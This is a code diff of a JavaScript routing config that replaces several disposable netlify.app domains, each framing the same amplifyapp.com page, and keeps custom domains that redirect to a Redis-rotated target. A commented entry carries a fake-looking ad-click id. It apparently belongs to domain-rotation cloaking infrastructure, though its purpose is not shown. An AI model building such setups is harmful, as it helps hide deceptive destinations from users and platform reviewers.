@@ -109,16 +109,18 @@ async function getRotationTarget(key) {
 //                    embed it in an iframe (target is ignored)
 const ORIGIN_GROUPS = {
   rocky: {
-    "https://aquamarine-cascaron-959598.netlify.app": { method: "iframe", target: "https://main.d3seyx62gk9k4j.amplifyapp.com" },
-    "https://silly-griffin-68e13a.netlify.app": { method: "iframe", target: "https://main.d3seyx62gk9k4j.amplifyapp.com" },
-    "https://resplendent-donut-186798.netlify.app": { method: "iframe", target: "https://main.d3seyx62gk9k4j.amplifyapp.com" },
-    "https://chipper-belekoy-fa4f48.netlify.app": { method: "iframe", target: "https://main.d3seyx62gk9k4j.amplifyapp.com" },
     "https://hiroakitravels.com": { method: "redirect", target: AMPLIFY_URL_FALLBACK, redisKey: KEY_AMPLIFY_URL },
     "https://teruogames.org": { method: "redirect", target: AMPLIFY_URL_FALLBACK, redisKey: KEY_AMPLIFY_URL },
-    "https://ornate-baklava-9b22fb.netlify.app": { method: "iframe", target: "https://main.d3seyx62gk9k4j.amplifyapp.com" }, // teruogames link
-    "https://spectacular-chimera-71aa18.netlify.app": { method: "iframe", target: "https://main.d3seyx62gk9k4j.amplifyapp.com" }, // teruogames link
-    "https://ubiquitous-bonbon-633229.netlify.app": { method: "iframe", target: "https://main.d3seyx62gk9k4j.amplifyapp.com" }, // teruogames link
-    "https://cool-kelpie-239781.netlify.app": { method: "iframe", target: "https://main.d3seyx62gk9k4j.amplifyapp.com" }, // teruogames link
+    //
+    "https://lively-brigadeiros-ffc38e.netlify.app": { method: "iframe", target: "https://main.d3seyx62gk9k4j.amplifyapp.com" }, // teruogames link
+    "https://inquisitive-kleicha-f1cebf.netlify.app": { method: "iframe", target: "https://main.d3seyx62gk9k4j.amplifyapp.com" }, // teruogames link
+    "https://vermillion-torrone-f39238.netlify.app": { method: "iframe", target: "https://main.d3seyx62gk9k4j.amplifyapp.com" }, // teruogames link
+    "https://endearing-tapioca-10a1fb.netlify.app": { method: "iframe", target: "https://main.d3seyx62gk9k4j.amplifyapp.com" }, // teruogames link
+    //
+    "https://resonant-biscotti-460173.netlify.app": { method: "iframe", target: "https://main.d3seyx62gk9k4j.amplifyapp.com" }, // takahiro link
+    "https://wonderful-puppy-27967e.netlify.app": { method: "iframe", target: "https://main.d3seyx62gk9k4j.amplifyapp.com" }, // takahiro link
+    "https://inquisitive-sable-1f0228.netlify.app": { method: "iframe", target: "https://main.d3seyx62gk9k4j.amplifyapp.com" }, // takahiro link
+    "https://luminous-kelpie-79f810.netlify.app": { method: "iframe", target: "https://main.d3seyx62gk9k4j.amplifyapp.com" }, // takahiro link
   },
   dmc: {
     // "https://middlepage.onrender.com/?gclid=twygyuewewewgvehwwhdwdwhdjwdhgwdsuidwdwd": { method: "iframe", target: "https://dmc1-environment.onrender.com" },
